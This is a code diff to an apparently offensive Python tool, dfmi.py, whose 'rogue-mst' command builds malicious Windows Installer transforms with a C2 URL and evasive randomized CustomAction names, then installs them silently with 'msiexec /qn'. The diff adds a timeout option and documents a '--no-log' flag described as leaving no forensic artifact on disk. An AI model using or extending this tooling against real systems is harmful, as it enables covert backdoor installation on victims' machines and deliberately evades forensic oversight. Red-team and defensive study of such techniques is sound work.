@@ -552,13 +552,17 @@ PowerShell COM backend — no pip install needed.
 Usage:
   python3 dfmi.py rogue-mst build  <original.msi> <output.mst> --c2 <url> [options]
   python3 dfmi.py rogue-mst verify <original.msi> <transform.mst>
-  python3 dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log]
+  python3 dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log] [--timeout N]
 
 Evasion Options (build):
   --action-name NAME  CustomAction name   (default: random)
   --property-name N   Property name       (default: random)
   --sequence NUM      Sequence position   (default: 1510)
   --drop-name NAME    EXE drop filename   (default: random, cmd mode only)
+
+Deploy Options:
+  --no-log          Skip install.log (no forensic artifact on disk)
+  --timeout N       msiexec timeout in seconds (default: 300, 0 = no limit)
 
 Deploy:
   msiexec /i original.msi TRANSFORMS=payload.mst /qn
@@ -704,7 +708,7 @@ if ($backdoorFound) {{
     if stderr and not ok: print(f"[!] {stderr}")
     return ok
 
-def _rogue_mst_deploy(original, transform, no_log=False):
+def _rogue_mst_deploy(original, transform, no_log=False, timeout=300):
     for f in [original, transform]:
         if not os.path.exists(f):
             print(f"[!] File not found: {f}"); return False
@@ -714,13 +718,16 @@ def _rogue_mst_deploy(original, transform, no_log=False):
         cmd = ['msiexec', '/i', original, f'TRANSFORMS={transform}', '/qn']
     else:
         cmd = ['msiexec', '/i', original, f'TRANSFORMS={transform}', '/l*v', 'install.log']
+    effective_timeout = None if timeout == 0 else timeout
+    timeout_label = "no limit" if effective_timeout is None else f"{effective_timeout}s"
     print(f"[*] Running: {' '.join(cmd)}")
+    print(f"[*] Timeout : {timeout_label}")
     try:
-        r = subprocess.run(cmd, timeout=300)
+        r = subprocess.run(cmd, timeout=effective_timeout)
         print(f"[*] Exit code: {r.returncode}")
         return r.returncode == 0
     except subprocess.TimeoutExpired:
-        print("[!] msiexec timed out after 300s"); return False
+        print(f"[!] msiexec timed out after {effective_timeout}s"); return False
 
 def cmd_rogue_mst(args):
     if not args or args[0] in ('-h', '--help'):
@@ -736,9 +743,17 @@ def cmd_rogue_mst(args):
         if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst verify <original.msi> <transform.mst>"); return
         _rogue_mst_verify(rest[0], rest[1])
     elif sub == 'deploy':
-        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log]"); return
+        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log] [--timeout N]"); return
         no_log = '--no-log' in rest
-        _rogue_mst_deploy(rest[0], rest[1], no_log=no_log)
+        timeout = 300
+        if '--timeout' in rest:
+            idx = rest.index('--timeout')
+            if idx + 1 < len(rest):
+                try:
+                    timeout = int(rest[idx + 1])
+                except ValueError:
+                    print(f"[!] --timeout must be an integer, got: {rest[idx+1]}"); return
+        _rogue_mst_deploy(rest[0], rest[1], no_log=no_log, timeout=timeout)
     else:
         print(f"[!] Unknown rogue-mst subcommand: {sub}"); print(HELP_ROGUE_MST)
 
